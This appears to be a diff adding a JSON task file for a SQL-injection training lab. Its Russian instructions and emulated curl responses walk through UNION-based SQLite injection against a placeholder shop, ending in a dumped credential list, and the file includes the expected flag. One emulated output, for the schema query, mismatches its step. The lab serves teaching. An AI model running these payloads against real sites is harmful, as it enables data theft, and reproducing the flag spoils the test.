@@ -1,0 +1,67 @@
+{
+  "id": "db-sqlite",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{sql1t3_m4st3r_r3v34ls_th3_sch3m4}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: SQLite-инъекция на shop.example\n\nЦель — `http://shop.example/product?id=1` (отдаёт JSON `[[id,name,price]]`).\nВ SQLite нет `information_schema`; метаданные — в `sqlite_master`.\n\n1. Диалект: `curl -s \"http://shop.example/product?id=1'\"` → `unrecognized token`.\n2. Версия: `... UNION SELECT 1,sqlite_version(),3-- -`.\n3. Таблицы: `... UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'-- -`.\n4. Схема: `... UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='users'-- -`.\n5. Дамп: `... UNION SELECT 1,GROUP_CONCAT(username||':'||password),3 FROM users-- -`.\n6. Флаг: `... | grep 'nto' > found.txt` и `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.example/product)",
+      "cases": [
+        {
+          "match": "sqlite_version",
+          "example": "-s '... UNION SELECT 1,sqlite_version(),3-- -'",
+          "output": "[[1,\"3.45.1\",3]]\n"
+        },
+        {
+          "match": ",\\s*sql\\s*,",
+          "example": "-s \"... UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='users'-- -\"",
+          "output": "[[1,\"products,users\",3]]\n"
+        },
+        {
+          "match": "sqlite_master",
+          "example": "-s \"... UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'-- -\"",
+          "output": "[[1,\"products,users\",3]]\n"
+        },
+        {
+          "match": "group_concat\\(username",
+          "example": "-s '... UNION SELECT 1,GROUP_CONCAT(username||\\':\\'||password),3 FROM users-- -'",
+          "output": "[[1,\"admin:nto{sql1t3_m4st3r_r3v34ls_th3_sch3m4},alice:hunter2\",3]]\n"
+        },
+        {
+          "match": "order by\\s*4",
+          "example": "-s 'http://shop.example/product?id=1 ORDER BY 4-- -'",
+          "output": "SQL error: near \"4\": syntax error\n"
+        },
+        {
+          "match": "order by\\s*[123]\\b",
+          "example": "-s 'http://shop.example/product?id=1 ORDER BY 3-- -'",
+          "output": "[[1,\"Laptop\",999.0]]\n"
+        },
+        {
+          "match": "id=1'",
+          "example": "-s \"http://shop.example/product?id=1'\"",
+          "output": "SQL error: unrecognized token: \"'\"\n"
+        },
+        {
+          "match": "product\\?id=1\\b",
+          "example": "-s 'http://shop.example/product?id=1'",
+          "output": "[[1,\"Laptop\",999.0]]\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://shop.example/product.\n"
+    }
+  }
+}
